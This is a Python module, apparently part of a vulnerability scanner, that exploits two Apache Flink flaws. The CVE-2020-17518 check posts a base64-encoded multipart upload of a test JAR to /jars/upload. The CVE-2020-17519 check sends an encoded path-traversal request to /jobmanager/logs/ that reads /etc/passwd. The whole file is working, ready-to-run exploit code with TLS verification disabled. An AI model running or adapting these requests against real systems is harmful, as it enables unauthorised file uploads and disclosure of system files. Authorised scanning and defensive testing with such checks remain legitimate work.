import requests
import binascii
from payload import headers,proxy

class ApacheFlink:


    def __init__(self):

        self.software = ["Apache Flink"]
        self.vul_list = ["CVE-2020-17518","CVE-2020-17519"]


    def poc_cve_2020_17518(self,url):

        url = url + "/jars/upload"
        contenttype = {"Content-Type": "multipart/form-data; multipart/form-data; boundary=----WebKitFormBoundaryK8JkqFBVwLdUVTdU"}
        headers.update(contenttype)


        payload = b"LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5SzhKa3FGQlZ3TGRVVlRkVQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImphcmZpbGUiOyBmaWxlbmFtZT0idGVzdC5qYXIiCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtCgp0ZXN0Ci0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeUs4SmtxRkJWd0xkVVZUZFUtLQ=="
        data = binascii.a2b_base64(payload).decode()

        req = requests.post(url=url,headers=headers,data=data,proxies=proxy,timeout=3)

        # if req.status_code == 200 and "test.jar" in req.text:
        if req.status_code == 200:
            return "CVE-2020-17518"

        return False

    def poc_cve_2020_17519(self,url):

        payload = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
        url =  url + payload
        req = requests.get(url=url,headers=headers,verify=False,timeout=3)

        if req.status_code == 200 and "root" in req.text:
            return "CVE-2020-17519"

        return False
